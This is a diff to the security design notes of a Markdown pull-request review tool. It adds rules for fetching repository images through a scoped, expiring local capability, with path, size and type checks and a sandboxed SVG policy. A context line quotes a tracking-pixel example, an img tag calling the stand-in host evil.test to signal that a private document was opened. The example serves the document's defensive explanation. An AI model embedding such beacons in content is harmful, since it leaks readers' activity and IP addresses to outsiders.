@@ -33,6 +33,15 @@ not cosmetic: an `<img src="https://evil.test/b.png?doc=x">` in a Markdown file 
 telling its author that a private document was opened, from your IP, at that moment, with no
 script involved.
 
+Repository-relative Markdown images are fetched by the local server at the pull request's exact
+head SHA. If GitHub reports the path missing there, the server retries the pull request's exact
+base SHA. An image element cannot send the API's custom header, so the PR response includes a
+random, in-memory capability limited to that repository and those two immutable commits. It
+expires after twelve hours, is cleared when credentials change, and grants no access to the
+GitHub token or other API routes. The server rejects paths outside the repository, files over 10
+MB, and bytes that do not match a supported image signature. SVG responses receive their own
+sandboxed `default-src 'none'` policy so embedded resources cannot create a second network channel.
+
 The server binds `127.0.0.1` only, never `0.0.0.0`.
 
 ### Desktop application
@@ -73,7 +82,8 @@ release page but cannot replace themselves.
 **Pull request content is untrusted.** Markdown permits raw HTML, and Marky McMarkface renders Markdown
 from arbitrary pull requests inside a page whose origin can reach a token-holding server. Output
 is sanitised with DOMPurify before it reaches the DOM. The sanitiser also removes automatic
-network loads except local, data, and GitHub-hosted images, so privacy does not depend on CSP alone.
+network loads except data images, approved GitHub image hosts, and repository images addressed
+through the scoped local capability, so privacy does not depend on CSP alone.
 
 **Scopes are the minimum GitHub allows.** `repo` and `read:org`. Classic OAuth has no read-only
 private-repo scope, and Marky McMarkface must write review comments, so `repo` is unavoidable rather than
